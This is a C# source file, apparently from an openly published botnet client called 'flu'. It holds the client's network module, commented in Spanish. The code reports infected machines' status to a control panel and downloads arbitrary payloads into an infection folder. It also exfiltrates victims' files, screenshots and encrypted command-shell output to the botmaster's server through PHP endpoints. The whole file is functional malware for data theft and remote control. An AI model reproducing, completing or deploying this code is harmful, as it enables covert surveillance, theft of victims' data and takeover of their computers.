using System;
using System.Collections.Specialized;
using System.Net;
using System.Web;
using System.Drawing;
using System.IO;
using System.Net.NetworkInformation;

namespace flu
{
    // 
    /// <summary>
    /// La clase Network (Red) engloba todas las funciones que acceden a Internet. Destacando las que interactuan con el servidor
    /// </summary>
    class Network
    {
        // Variables con el dominio, ruta donde se encuentra el XML con las instrucciones y la MAC del bot
        public static string Domain = "";
        public static string XML    = "";
        public static string MAC    = "";

        /// <summary>
        /// Comprueba si el equipo infectado tiene acceso a Internet para poder comunicarnse con el servidor
        /// </summary>
        /// <returns>Devuelve TRUE/FALSE dependiendo de si el equipo infectado tiene conexión a Internet</returns>
        public static bool Online()
        {
            HttpWebRequest request;
            HttpWebResponse response;
            try {
                request  = (HttpWebRequest)WebRequest.Create(Network.Domain);
                response = (HttpWebResponse)request.GetResponse();
                request.Abort();
                return response.StatusCode == HttpStatusCode.OK;
            } catch { return false; }
        }

        /// <summary>
        /// Actualiza el estado del bot (conectado/desconectado) en el panel de control de la botnet
        /// </summary>
        public static void UpdateState(string systemVersion)
        {
            WebClient wb = new WebClient();
            string url = Network.Domain + "/actualizarEstadoMaquina.php?m=" + HttpUtility.UrlEncode(Network.MAC)+"&s="+HttpUtility.UrlEncode(systemVersion);
            wb.DownloadString(new Uri(url));
        }

        /// <summary>
        /// Descarga un fichero cualquiera desde una url en la ruta que le sea indicado en el parámetro filename
        /// </summary>
        /// <param name="url">URL donde se encuentra el archivo a descargar</param>
        /// <param name="filename">Ruta donde se almacenará el archivo</param>
        public static string DownloadFile(string url)
        {
            string[] cadenas = url.Split('/');
            string filename = cadenas[cadenas.Length - 1];
            string path = OS.InfectionPath() + "\\" + filename;
            try {
                WebClient client = new WebClient();
                client.DownloadFile(url, path);
            } catch {}
            return path;
        }

        /// <summary>
        /// Envía un archivo de la máquina al panel de control de la botnet con su firma en SHA1 y MD5 para verificar que no ha sido modificado
        /// </summary>
        /// <param name="path">Ruta donde se encuentra el archivo que se enviará al botmaster</param>
        /// <param name="command">Nombre del comando solicitado</param>
        /// <param name="uniqueID">ID único utilizado para que el botmaster identifique a que comando solicitado corresponde esta información</param>
        public static void SendFile(string path, string command, string uniqueID)
        {
            string content      = File.ToBase64(path);
            string[] format     = path.Split('.');
            string extension    = "." + format[format.Length - 1];
            path                = path.Replace("/", "\\");
            string[] filename   = path.Split('\\');

            NameValueCollection data = new NameValueCollection();
            data.Add("m",           Network.MAC);   //Agregamos la MAC 
            data.Add("comando",     command);       //Agregamos el comando
            data.Add("id",          uniqueID);      //Agregamos el id del comando
            data.Add("formato",     extension);     //Agregamos el formato del archivo
            data.Add("nombre",      filename[filename.Length - 1].Remove(filename[filename.Length - 1].IndexOf(extension))); //Agregamos el nombre
            data.Add("respuesta",   content);       //Agregamos el archivo convertido a base64
            data.Add("firmaSHA1", Crypto.getSignature(path,"SHA1")); //Agregamos la firma del archivo, para verificar que no ha sido modificado
            data.Add("firmaMD5", Crypto.getSignature(path, "MD5")); //Agregamos la firma del archivo, para verificar que no ha sido modificado

            //Realizamos el envio por POST
            WebClient wb = new WebClient();
            wb.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            byte[] responseArray = wb.UploadValues(Network.Domain + "/RecibirArchivo.php", data);
        }

        /// <summary>
        /// Envía una captura de pantalla del equipo al panel de control de la botnet
        /// </summary>
        public static void SendImage()
        {
            NameValueCollection data = new NameValueCollection();
            data.Add("respuesta", OS.CaptureScreen());
            data.Add("maquina", Network.MAC);
            WebClient wb = new WebClient();
            wb.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            byte[] responseArray = wb.UploadValues(Network.Domain + "/RecibirImagen.php", data);
        }

        /// <summary>
        /// Envía al panel de control de la botnet la respuesta devuelta por un CMD/Powershell al comando solicitado por el botmaster
        /// </summary>
        /// <param name="info">Respuesta del comando solicitado</param>
        /// <param name="command">Nombre del comando solicitado</param>
        /// <param name="uniqueID">ID único utilizado para que el botmaster identifique a que comando solicitado corresponde esta información</param>
        /// <param name="lastPacket">Indíca al botmaster que se trata del último paquete de la respuesta a un comando largo, enviado a trozos</param>
        public static void SendInformation(String info, string command, string uniqueID, int lastPacket)
        {
            string enlace = "";

            info = info.Replace("\\", "\\\\");
            info = info.Replace("á", "&aacute;"); info = info.Replace("é", "&eacute;");
            info = info.Replace("í", "&iacute;"); info = info.Replace("ó", "&oacute;");
            info = info.Replace("ú", "&uacute;"); info = info.Replace("ñ", "&ntilde;");

            if (uniqueID == "") { uniqueID= "0"; }
            enlace = Network.Domain + "/RecibirDatosVictima.php?comando=" + command +
                    "&respuesta=" + HttpUtility.UrlEncode(Crypto.EncryptRijndael(info)) +
                    "&m=" + HttpUtility.UrlEncode(Network.MAC) +
                    "&id=" + HttpUtility.UrlEncode(uniqueID) +
                    "&fin=" + HttpUtility.UrlEncode(lastPacket.ToString());
            WebClient wb = new WebClient();
            wb.DownloadString(new Uri(enlace));
        }
    }
}
